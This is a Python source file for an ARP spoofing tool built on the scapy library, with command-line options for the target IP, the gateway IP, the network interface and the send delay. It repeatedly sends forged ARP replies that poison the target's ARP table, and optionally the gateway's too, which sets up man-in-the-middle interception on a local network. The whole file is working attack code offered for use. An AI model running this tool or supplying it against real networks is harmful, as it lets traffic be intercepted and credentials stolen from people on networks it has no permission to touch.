import scapy.all as scapy
import sys
import time

# to run in linux:
# sudo python3 main.py [args]

target_ip = "192.168.1.135"  # Enter your target IP
spoof_ip = "192.168.1.1"  # Enter your gateway's IP
attack_gw = False
interface = None
delay = 2


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    try:
        if interface is not None:
            answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False, interface=interface)[0]
        else:
            answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    except:
        print("interface is unavailable")
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip),
                       psrc=spoof_ip)
    try:
        if interface is not None:
            scapy.send(packet, verbose=False, interface=interface)
        else:
            scapy.send(packet, verbose=False)
    except:
        print("interface is unavailable")
    scapy.send(packet, verbose=False)


def main():
    try:
        sent_packets_count = 0
        while True:
            spoof(target_ip, spoof_ip)
            if attack_gw:
                spoof(spoof_ip, target_ip)
            sent_packets_count = sent_packets_count + 1
            print("\r[*] Packets Sent " + str(sent_packets_count), end="")
            time.sleep(delay)  # Waits for two seconds

    except KeyboardInterrupt:
        print("\nCtrl + C pressed.............Exiting")
        print("[+] Arp Spoof Stopped")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] == "-h" or sys.argv[1] == "--help":
            print("usage:\n     ArpSpoofer.py [-h] [-i IFACE] [-s SRC] [-d DELAY] [-gw] -t TARGET")
            print("\nSpoof ARP tables\noptional arguments:")
            print("-h, --help                      show this help message and exit")
            print(" -i IFACE, --iface IFACE        Interface you wish to use")
            print(" -s SRC, --src SRC              The address you want for the attacker")
            print(" -d DELAY, --delay DELAY        Delay (in seconds) between messages")
            print(" -gw                            should GW be attacked as well")
            print(" -t TARGET, --target TARGET     IP of target")
            exit()
        if "-gw" in sys.argv:
            attack_gw = True
        if "-t" in sys.argv or "--target" in sys.argv:
            index = -1
            if "-t" in sys.argv:
                index = sys.argv.index("-t")
            else:
                index = sys.argv.index("--target")
            target_ip = sys.argv[index + 1]
        if "-d" in sys.argv or "--delay" in sys.argv:
            index = -1
            if "-d" in sys.argv:
                index = sys.argv.index("-d")
            else:
                index = sys.argv.index("--delay")
            delay = int(sys.argv[index + 1])
        if "-s" in sys.argv or "--src" in sys.argv:
            index = -1
            if "-s" in sys.argv:
                index = sys.argv.index("-s")
            else:
                index = sys.argv.index("--src")
            spoof_ip = sys.argv[index + 1]
        if "-i" in sys.argv or "--iface" in sys.argv:
            index = -1
            if "-i" in sys.argv:
                index = sys.argv.index("-i")
            else:
                index = sys.argv.index("--iface")
            interface = sys.argv[index + 1]

    main()
